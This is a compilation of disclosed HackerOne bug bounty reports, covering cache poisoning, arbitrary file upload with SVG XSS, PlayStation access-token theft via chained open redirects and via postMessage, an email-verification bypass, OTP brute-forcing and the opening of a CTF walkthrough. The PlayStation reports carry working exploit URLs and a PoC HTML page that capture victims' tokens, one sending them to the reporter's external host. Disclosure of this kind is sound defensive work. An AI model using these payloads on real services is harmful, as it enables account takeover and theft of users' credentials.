AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

* The server will return a 400 status code response and cache the response.
* Now, send the request below. Normally, it should return a 404 response.
```http
GET /yeettest?yeettest=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Host: www.████████
Connection: Keep-alive
```
* However it returns the same response as the previous one, which means that the response was cached.

**Note:** I have done these tests on the path `/yeettest?yeettest=1` in order to not disrupt the experience of the website's users. However, an attacker would use this bug on the main page.

## Suggested Mitigation/Remediation Actions
Do not cache responses with error-related status codes.

---

### [Arbitrary file upload and stored XSS via ███ support request](https://hackerone.com/reports/865354)

- **Report ID:** `865354`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:06:40.316Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A malicious user can upload files of any type when submitting a support request. 

## Impact
This would allow the attacker to upload malicious executable files as well as `.html` or `.svg` files which would allow the attacker to execute malicious code on behalf of the ████ customer support representative.

## Step-by-step Reproduction Instructions

1. Browse to████████ and create an account or sign in if you already have an account.
2. Click `█████ Faculty/Staff IT Support`.
█████████
3. Click `██████ Support`
██████████
4. Complete the form and upload a file of your choice. Click Submit.
█████████
5. You will see that your request has been created, and your files are readily available for download.
█████████
6. If the customer support representative downloads the executable, their machine could be compromised. This is unlikely, however what is more likely is for the representative to open a malicious `.svg` (or `.xls`/`.doc`/etc.) file.
██████████
7. Opening the `.svg` file in a browser would fire the XSS.
███████
8. Instead of the `alert(XSS)` payload, an attacker could use `window.location` to redirect the user to a malicious website. They could also craft a fake login page that would appear to be the `████████` login page. Once the unsuspecting user submits their credentials, the malicious page would redirect the user to the real login page and the users credentials would be stored on the attackers machine.

## Suggested Mitigation/Remediation Actions
Whitelist allowed file types for upload (`.pdf`, `.jpg`, etc) as needed.

## Impact

This would allow the attacker to upload malicious executable files as well as `.html` or `.svg` files which would allow the attacker to execute malicious code on behalf of the █████ customer support representative.

---

### [Access Token Smuggling from my.playstation.com via Referer Header](https://hackerone.com/reports/835437)

- **Report ID:** `835437`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** PlayStation
- **Reporter:** @nnez
- **Bounty:** 1000 usd
- **Disclosed:** 2021-01-12T01:40:31.909Z
- **CVE(s):** -

**Summary (team):**

I discovered a way to smuggle an access token from my.playstation.com via Referer header through chain of open redirection vulnerability.  

On my investigation of authentication flow I found this endpoint with potential site for open redirect vulnerability

https://my.playstation.com/auth/response.html

Let's look at some part of the code on this endpoint.

```
function sendResponseToApp(a) {
    var b = extractFrameTypeFromRequestID(a.requestID),
        c = a.targetOrigin || getOrigin(),
        d = a.baseUrl || "",
        e = a.returnRoute || "",
        f = a.excludeQueryParams,
        g = !f && window.location.search || "";
    switch (b) {
        case "iframe":
            window.parent.postMessage(a, c);
            break;
        case "window":
            window.opener.postMessage(a, c);
            break;
        case "external":
        default:
            var h = constructUrl(c, d, e) + g;
            /^(https:\/\/)([a-z0-9\-]+\.)+(playstation\.com)(:([0-9]){4})?\//.test(h) ? window.location.href = h : window.location.href = "https://playstation.com/error"
    }
}
```

This is a switch statement checking on variable named requestID
The interesting part for this report is the last condition where requestID is equal to "external".  

This condition basically says that if requestID is equal to "external" then construct URL from query parameters and redirect to that URL.  
There is also a regex filter to protect against Open Redirect. The target for redirection can only be a subdomain of playstation.com.  

The only way this is vulnerable to open redirect is that there is a sub-domain that is vulnerable to open redirect as well.  
I spend sometimes hutning on that and I discovered an endpoint on docs.playstation.com that is vulnerable to open redirect.  
Here is the endpoint I mentoined.

`https://docs.playstation.com/consumers/auth/psn_oauth2?callback_url=https://www.google.co.th`

Following this endpoint a user will be redirected to authentication portal first, if already logged in, redirected back to

`https://docs.playstation.com/consumers/auth/psn_oauth2/callback?code=${code}&state=${state}&cid=${cid}`

The above endpoint will consume the authorization code and then give back jwt access token (valid on docs.playstation.com only) and redirect user to *callback_url* with jwt token in query parameter.  

At first, I thought that this is an open redirect on out-scope domain, even if I can chain it with in-scope (which is the first endpoint I mentioned) it is not much a security threat.

However, after code review and testing, I discovered a way to smuggle an access token from my.playstation.com via Referer header and send it to attacker site using this chain of redirection. **Here is how**.  

Initially, I observed that when I chain said open redirect from my.playstation.com to docs.playstation.com then to attacker site, the Referer header contains the URL of my.playstation.com endpoint with some query parameters

Try this yourself (you need to login on playstation network first, maybe on my.playstation.com)

`https://my.playstation.com/auth/response.html?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&baseUrl=/&targetOrigin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.google.co.th`

```
Request Headers to google
:authority: www.google.co.th
:method: GET
:path: /?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&consumer_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm92aWRlciI6InBzbl----redacted----zg0NjkxMzU2NjAwMjkwNDMwIiwiZXhwIjoxNTg2MjcwNjQ5fQ.8XXCliCQwBwussk9uNsA1Kiiqgn0vsyP-KUCGpQNMaw
:scheme: https
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
accept-encoding: gzip, deflate, br
accept-language: th,en-US;q=0.9,en;q=0.8
referer: https://my.playstation.com/auth/response.html?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&baseUrl=/&targetOrigin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.google.co.th
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: cross-site
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
```

Now let's go back to the purpose of this endpoint. (/auth/response.html)  
It is used to receive access token from auth.api.sonyentertainmentnetwork.com after user login

Authentication flow is like this.
1.) Click sign-in button from my.playstation.com
2.) Redirect to auth.api.sonyentertainmentnetwork.com with redirect_uri set to my.playstation.com/auth/response.html  
3.) After login, (or if already logged in), redirect to redirect_uri with access_token in attached in hash fragment of the URL
4.) Redirect back to my.playstation.com
5.) iframe points to endpoint in 2.) is created, access_token is sent back to the page via postMessage function.

**redirect_uri** is only being validated for its origin, so what comes after that is user-controllable.

Therefore, I could use this URL
`https://my.playstation.com/auth/response.html?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&baseUrl=/&targetOrigin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.google.co.th` as the payload, if a user is already logged in, he/she will go through chain of redirection and finally get to google.

Try it:  
[https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize...callback_url=https://www.google.co.th](https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dexternal_request_3b961caf-d776-48bd-953e-fca6a0526d91%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fdocs.playstation.com%26returnRoute%3D%2Fconsumers%2Fauth%2Fpsn_oauth2%3Fcallback_url%3Dhttps%3A%2F%2Fwww.google.co.th)

The problem is that access token is stored in hash fragment which does not reflect on Referer header. To smuggle this access token I would need to find a way to make access token in query parameters instead of hash fragment.  

I noticed that I could also put hash fragment in **redirect_uri** and the hash fragment on /auth/response.html would be  

```
#foo=bar&access_token=...&token_type=...
```

Let's look at the code responsible for extracting parameters from query string and hash fragment of the URL on this endpoint

```
function parseResponse(a) {
    var b = a.hash.substr(1),
        c = a.search.substr(1),
        d = b + "&" + c,
        e = convertToObject(d);
    return e.refererURL = a.toString(), e
}

function convertToObject(a, b, c) {
    b = b || "&", c = c || "=";
    var d = a.indexOf("?");
    if (-1 !== d) {
        var e = a.substr(d);
        a = a.substr(0, d) + encodeURIComponent(e)
    }
    var f = {},
        g = {};
    return a.split(b).forEach(function (a) {
        if (a = a.split(c), 2 === a.length) {
            var b = decodeURIComponent(a[0]),
                d = decodeURIComponent(a[1]);
            "state" === b ? g = convertToObject(d, "_._", "~~~") : f[b] = d
        }
    }), union(f, g)
}

function union(a, b) {
    var c, d = {};
    for (c in a) d[c] = a[c];
    for (c in b) d[c] = b[c];
    return d
}
var response = parseResponse(window.location);
```

It puts hash fragment and query string together with `&` in-between then send it to convertToObject function to put all of variables and their values in key-value pair object.

The delimiters are **=** and **&** to split between key and value and key and key respectively.  
There is also a special condition in which the key name is **state**, it will go make key-value pair object from state's value using **_._** and **~~~** as delimiter.

Now let's go back to the first code I provided `function sendResponseToApp` and consider how target URL is constructed.
```
    var b = extractFrameTypeFromRequestID(a.requestID),
        c = a.targetOrigin || getOrigin(),
        d = a.baseUrl || "",
        e = a.returnRoute || "",
        f = a.excludeQueryParams,
        g = !f && window.location.search || "";
    /// Some are removed to make it easier to read ///
        var h = constructUrl(c, d, e) + g;
```
Basically, constructUrl is just concatenate value from c,d, e, and g together. The point is what is c, d, e, and g. It is quite straightforward that  
c = targetOrigin, d = baseUrl, e = returnRoute and g = query strings  

So, primarily constructURL consists of  
targetOrgin + baseUrl + returnRoute + query strings  

Now that we have reviewed the code necessary, let's get to how the exploit work.  
Again, the core idea is that I need to make access token in query strings instead of hash fragment so that it get reflected in Referer header.  

Basic idea of how to do that,
1.) Somehow put access token in returnRoute so that it is included in query string of target URL for redirection
2.) Redirect to my.playstation.com/auth/response.html with access token in query string
3.) Redirect again to docs.playstation.com then to attacker site.
4.) Now Referer header contains access token.

Let's go in detail  
In convertToObject function
```
    var d = a.indexOf("?");
    if (-1 !== d) {
        var e = a.substr(d);
        a = a.substr(0, d) + encodeURIComponent(e)
    }
```
if there is **?** in string *d*, it will encode what comes after **?** before processing string *d* to make key-value pair object. 
an example of value in string *d* would be
```
access_token=...&token_type=bearer&...key-value from query string
```

So, if **redirect_uri** ends with `#returnRoute=/auth/response.html?`, the value in string *d* would be
```
returnRoute=/auth/response.html?&access_token=...&token_type=bearer
```
and because there is **?**, what comes after that is encoded so string *d* will be changed to
```
returnRoute=/auth/response.html?%26access_token%3D...%26token_type%3Dbearer
```
From code review above, this function uses **=** and **&** as delimiter, the access token will be included in returnRoute as query string.

To redirect to my.playstation.com just put `targetOrigin=https://my.playstation.com` before returnRoute
```
#targetOrigin=https://my.playstation.com&returnRoute=/auth/response.html?...
```  
and also add `excludeQueryParams=true` to not include query string again.

Final step, to redirect to docs.playstaion.com   
In parseResponse function, to make string *d*, it concatenates hash fragment and query string together with **&** in-between and it put query string behind hash fragment.  

So, if **redirect_uri** ends with the latest payload, all of query parameters would be put in returnRoute as well since **=** and **&** are all encoded and are all included in target URL.

To redirect to docs.playstation.com and to attacker site just put  
`baseUrl=/&targetOrgin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.attacker.com` as query string of **redirect_uri**

Here is the final payload
```
https://my.playstation.com/auth/response.html?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&baseUrl=/&targetOrigin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.attacker.com#targetOrigin=https://my.playstation.com&excludeQueryParams=true&returnRoute=/auth/response.html?
```

**Proof-of-Concept Link**
https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dexternal_request_3b961caf-d776-48bd-953e-fca6a0526d91%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fdocs.playstation.com%26returnRoute%3D%2Fconsumers%2Fauth%2Fpsn_oauth2%3Fcallback_url%3Dhttps%3A%2F%2Fnnez-poc.000webhostapp.com%2Fc2ba5d6f36bf7572ab73644b97fee017.html%23targetOrigin%3Dhttps%3A%2F%2Fmy.playstation.com%26excludeQueryParams%3Dtrue%26returnRoute%3D%2Fauth%2Fresponse.html%3F

In PoC link, I redirect you to my website, it will automically extract access token from referer header.


## Impact

An attacker is allowed to access victim's resources on my.playstation.com granted by stolen access token.

---

### [Email Verification bypass on signup](https://hackerone.com/reports/1040047)

- **Report ID:** `1040047`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** Automattic
- **Reporter:** @farhan0x00
- **Bounty:** - usd
- **Disclosed:** 2020-12-03T08:43:26.221Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
This bug is related to wordpress.com. There is feature in wordpress.com which allow users to invite people. We have to enter email address to invite that particular person but the invite link and invite key is also available to the person who invited. This allow attackers to create the profile without having access to the email address and they can make account on behalf of any people who  is not already signed up in wordpress.com

## Platform(s) Affected:
wordpress.com
public-api.wordpress.com

## Steps To Reproduce:
This issue can be reproduced by following these easy steps: 
* Login to your account on wordpress.com
* Setup burpsuite proxy with browser.
* Select your site and navigate to manage>people
* Enter any email address which is not already registered in wordpress.com and invite
* Open this url in browser: https://wordpress.com/people/invites/yoursite.wordpress.com   [change yoursite.wordpress.com with your site]
* See the burp suite proxy tab and find the GET request to this endpoint [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100]     [there will be a number instead of siteId_here]
* In response of this GET request you will see JSON which will be consisting of the details about the invitations sent and there you will find "invite_key" and "link".
* Copy the link and open this in another browser.
* You can create account on behalf of this email without having access to the email and email verification is bypassed :)

**See the attached video for POC**

## Mitigation:
This is the pure violation of secure design principles, this can be mitigated by just removing the [invite_key] and [link] from the response in [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100]. Because this invite key and link is the property of the person being invited, showing these creds to other people will result this type of issue.

## Impact

This issue can be used to bypass email verification on signup. Attackers can create account on behalf on any person without having access to the email account. This issue is affecting integrity of the wordpress.com

---

### [On Singing up with a Phone number , The 4 digit OTP does not expires for a long time leading to an easy attack and make a verified account easilty](https://hackerone.com/reports/792295)

- **Report ID:** `792295`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** Bumble
- **Reporter:** @theuniversaldude
- **Bounty:** - usd
- **Disclosed:** 2020-11-25T18:11:12.110Z
- **CVE(s):** -

**Vulnerability Information:**

Hello there how are you doing ?
Go to sign up page and enter a new phone number and you will be redirected to https://bumble.com/registration/confirm-phone .
You will receive a easy breakable 4 digit OTP Code .
I waited for about 4 hours and the OTP did not expired , This shows that the OTP can be easily bruteforced even having the rate limiting , assuming rate limiting is implemented as this is an old program .
The OTP can be bruteforced , by changing IP via VPN and as the OTP does not expires for a long time it gives sufficient time , to get the actual OTP Code also the OTP is only of 4 digits , So it only requires 10,000 requests .


For Solving of this issue , Captcha Implementation is recommended .
POC - Please check screenshots

## Impact

Impact
Registering with a different person mobile number without actual verification .
Impersonating other's identity .

---

### [Authorization Token on PlayStation Network Leaks via postMessage function](https://hackerone.com/reports/826394)

- **Report ID:** `826394`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** PlayStation
- **Reporter:** @nnez
- **Bounty:** 1000 usd
- **Disclosed:** 2020-11-21T00:35:14.023Z
- **CVE(s):** -

**Summary (team):**

# Description
After some analysis on how playstation network authentication work, I came across a certain pattern of how authorization tokens are handled.
The web application utilizes postMessage function to exchange authorization tokens between windows/frames.

To simplify this, let's follow on one of authorization flows.
When you enter, https://my.playstation.com
There is a request to

https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Diframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fmy.playstation.com&prompt=none

to get an authorization token for corresponding scopes in the above URL. If user is already authenticated and has permission for all of the scopes, the redirection will be made to redirect_uri which is https://my.playstation.com/auth/response.html?requestID=iframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2&baseUrl=/&targetOrigin=https://my.playstation.com&prompt=none

The request is made using an iframe and the token will be sent back via postMessage and the problem lies on how this authorization token is sent.
Consider the javascript function (view source on above URL) responsible for sending token back.

````
function sendResponseToApp(a) {
    var b = extractFrameTypeFromRequestID(a.requestID),
        c = a.targetOrigin || getOrigin(),
        d = a.baseUrl || "",
        e = a.returnRoute || "",
        f = a.excludeQueryParams,
        g = !f && window.location.search || "";
    switch (b) {
        case "iframe":
            window.parent.postMessage(a, c);
            break;
        case "window":
            window.opener.postMessage(a, c);
            break;
        case "external":
        default:
            var h = constructUrl(c, d, e) + g;
            /^(https:\/\/)([a-z0-9\-]+\.)+(playstation\.com)(:([0-9]){4})?\//.test(h) ? window.location.href =
                h : window.location.href = "https://playstation.com/error"
    }
}
```

If the requestID starts with window, the token will be sent back to window.opener instead of window.parent and targetOrigin is controlled by user via GET parameter with the same name.

Therefore, if the authorization endpoint is opened from a malicious page via window.open and target origin is set to * (wildcard), the token will be sent back to malicious page.

Here is a PoC code I wrote to demonstrate this

```
<!Doctype HTML>
<html>
    <head>
        <title>PlayStation Authorization Token Leaks via postMessage</title>
    </head>
    <body>
        <script type="text/javascript">
        window.addEventListener("load", () => {
            document.getElementById("startBtn").addEventListener("click", () => {
                var x = window.open('https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dwindow_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3D*&prompt=none', 'mywindow');
                window.onmessage = (e) => {
                    document.getElementById("token-plate").innerText = JSON.stringify(e.data);
                }
            });
        });
        </script>
        <h1>PlayStation Authorization Token Leaks via postMessage</h1>
        <button id="startBtn" style='padding: 0.5em; font-size: 1.2em; width: 200px;'>Start</button>
        <div id="token-plate" style="margin: 1em; padding: 1.2em; border: 1px solid #ddd;">
            <em>Token Plate</em>
        </div>
        <footer>
            @nnez | HackerOne
        </footer>
    </body>
</html>
```

# Steps to Reproduce
Login on playstation network, maybe at https://my.playstation.com or https://store.playstation.com
Go to malicious page with provided code, or you can go to this PoC I hosted, http://nnez-poc.000webhostapp.com/e1f47833ad18d94a20780d81f8060c79.html
Click on start button, after the window is opened, navigate back and you will see access token in the box.

# Additional Notes
This also happened on other endpoints with the same code base such as

https://social.playstation.com/starblaster2/pdc/master/auth/response-6bd54237a5ffea223e2784fcd88c34e1.html?requestID=iframe_request_f179f207-79d8-4659-b1d4-f85e6c57a212&baseUrl=/starblaster2/pdc/master/&targetOrigin=https://store.playstation.com

but with different range of permission scopes.


# Impact
An authorization token on my.playstation.com would allow an attacker to impersonate as a victim, access to sensitive information, post on victim news feed
An authorization token on social.playstation.com would allow an attacker to impersonate as a victim, access to friends list and chat with victim's friends.

---

### [[H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin](https://hackerone.com/reports/894863)

- **Report ID:** `894863`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** h1-ctf
- **Reporter:** @rreiss
- **Bounty:** - usd
- **Disclosed:** 2020-06-22T16:23:59.827Z
- **CVE(s):** -

**Vulnerability Information:**

First of all, thanks for the awesome CTF. I enjoyed it very much :)

## Summary
The CTF was about helping HackerOne's beloved CEO, @martenmickos, to approve May bug bounty payments after he has lost his login details for BountyPay.

It all started with this tweet:
{F860982}

And as you all know, I had to help him since ~~ItTakesACrowd~~! Ohh sorry.. That's not our motto here, but **TogetherWeHitHarder** is! ;)

Let's start by saying that Marten can relax, I paid it all. I've sacrificed a few sleepless nights just for him to sleep well. 💙
{F859739}
Flag: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

In this report, I'll try to **focus more on my way of thinking**, rather than on the technical implementation so others will be able to learn what I've learned and use it to hit harder and make our world a safer place.

## CTF Walkthrough

## Recon
I've started the challenge by performing two basic recon steps:
  - Subdomain enumeration with [subfinder](https://github.com/projectdiscovery/subfinder) (`subfinder -d bountypay.h1ctf.com`).
This revealed the following subdomains:

```bash
app.bountypay.h1ctf.com
www.bountypay.h1ctf.com
bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
api.bountypay.h1ctf.com
```

  - Directories/files enumeration with [ffuf](https://github.com/ffuf/ffuf) and [SecLists](https://github.com/danielmiessler/SecLists) which found a `.git/HEAD` file in app.bountypay.h1ctf.com.
  
```
ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u "https://app.bountypay.h1ctf.com/FUZZ" -ac
```
{F859753}

In short, that means that we may be able to retrieve more information about the code in this application and maybe find some holes.
To retrieve more information about the Git configuration, I opened `https://app.bountypay.h1ctf.com/.git/config` in my browser and it downloaded the Git configuration file to my machine.
